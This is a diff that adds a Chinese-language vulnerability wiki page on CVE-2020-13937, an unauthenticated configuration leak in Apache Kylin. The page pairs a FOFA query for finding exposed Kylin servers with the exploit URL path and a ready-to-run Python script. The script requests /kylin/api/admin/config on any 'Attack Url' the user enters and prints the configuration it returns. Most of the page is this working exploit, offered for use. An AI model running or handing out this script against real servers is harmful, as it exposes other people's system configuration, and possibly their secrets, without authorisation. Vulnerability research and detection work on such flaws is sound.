@@ -1,0 +1,66 @@
+# Apache Kylin的未授权配置泄露 CVE-2020-13937
+
+### FOFA
+
+app="APACHE-kylin"
+
+### **受影响的版本：**
+
+Apache Kylin 有一个restful api会在没有认可认证的情况下暴露配置信息。
+
+Kylin 2.x.x
+
+Kylin <= 3.1.0
+
+Kylin 4.0.0-alpha
+
+### 漏洞利用
+
+根据漏洞情报
+
+![](image/apache kylin-1.png)
+
+漏洞利用POC为{% em type="red" %}http://xxx.xxx.xxx.xxx/kylin/api/admin/config{% endem %}
+
+![](image/apache kylin-2.png)
+
+## 漏洞检测POC
+
+```python
+import requests
+
+def title():
+    print('+------------------------------------------')
+    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
+    print('+  \033[34mVersion: Apache Kylin 2.x.x <= 3.1.0 Kylin 4.0.0-alpha            \033[0m')
+    print('+  \033[36m使用格式: python3 cve-2019-13937.py                                 \033[0m')
+    print('+  \033[36mUrl    >>> http://xxx.xxx.xxx.xxx:9999                            \033[0m')
+    print('+------------------------------------------')
+
+def POC_1(target_url):
+    vuln_url = target_url + "/kylin/api/admin/config"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
+    }
+    try:
+        response = requests.get(url=vuln_url, headers=headers, timeout=20)
+        if "config" in response.text:
+            print("\033[32m[o] 存在Apache Kylin的未授权配置泄露\n[o] 响应为:\n\033[0m",response.text)
+        else:
+            print("\033[31m[x] 目标Url漏洞利用失败\033[0m")
+    except:
+        print("\033[31m[x] 目标Url漏洞利用失败\033[0m")
+
+if __name__ == '__main__':
+    title()
+    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
+    POC_1(target_url)
+```
+
+![](image/apache kylin-3.png)
+
+
+
+### 参考
+
+[CVE-2020-13937|Apache Kylin的未授权配置泄露漏洞，腾讯安全全面支持检测](https://s.tencent.com/research/bsafe/1156.html)
